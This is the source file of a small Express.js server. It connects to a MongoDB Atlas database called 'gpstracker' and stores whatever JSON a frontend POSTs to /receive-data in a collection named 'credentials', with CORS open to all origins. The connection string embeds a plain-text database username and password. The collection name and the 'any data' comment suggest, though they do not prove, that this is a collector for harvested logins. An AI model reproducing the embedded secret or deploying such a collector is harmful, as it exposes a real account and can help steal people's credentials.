// Import the necessary modules
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const { MongoClient } = require('mongodb');

// Initialize the Express application
const app = express();
const port = 3001; // Changed port to 3001 to avoid conflicts

// MongoDB connection URI
// Use the MongoDB Atlas connection string provided
const mongoUri = 'mongodb+srv://gps_tracker_user:qT0hpSNxKUz5dgb2@cluster0.gg5dvod.mongodb.net/gpstracker?retryWrites=true&w=majority&appName=Cluster0';
const client = new MongoClient(mongoUri);

let credentialsCollection;

// Middleware setup
app.use(bodyParser.json()); // Parses incoming JSON requests
app.use(cors()); // Enables Cross-Origin Resource Sharing (CORS)

// Asynchronously connect to MongoDB before starting the server
async function connectToMongo() {
  try {
    await client.connect();
    console.log("Successfully connected to MongoDB");
    const db = client.db('gpstracker'); // Explicitly connect to the 'gpstracker' database
    credentialsCollection = db.collection('credentials');
    
    // Start the server only after a successful database connection
    app.listen(port, () => {
      console.log(`Backend server listening at http://localhost:${port}`);
      console.log('Waiting for POST requests to /receive-data');
    });

  } catch (error) {
    console.error("Could not connect to MongoDB:", error);
    process.exit(1);
  }
}

/**
 * POST /receive-data
 * This endpoint receives any data from the frontend and stores it in MongoDB.
 */
app.post('/receive-data', async (req, res) => {
  const receivedData = req.body;

  try {
    // Insert the data into the credentials collection
    const result = await credentialsCollection.insertOne(receivedData);
    console.log(`Successfully inserted document with _id: ${result.insertedId}`);

    // Send a success response back to the frontend
    return res.status(200).json({
      success: true,
      message: 'Data received and stored successfully.'
    });
  } catch (error) {
    console.error("Error inserting data into MongoDB:", error);
    return res.status(500).json({
      success: false,
      message: 'Failed to store data.'
    });
  }
});

// Execute the connection function
connectToMongo();
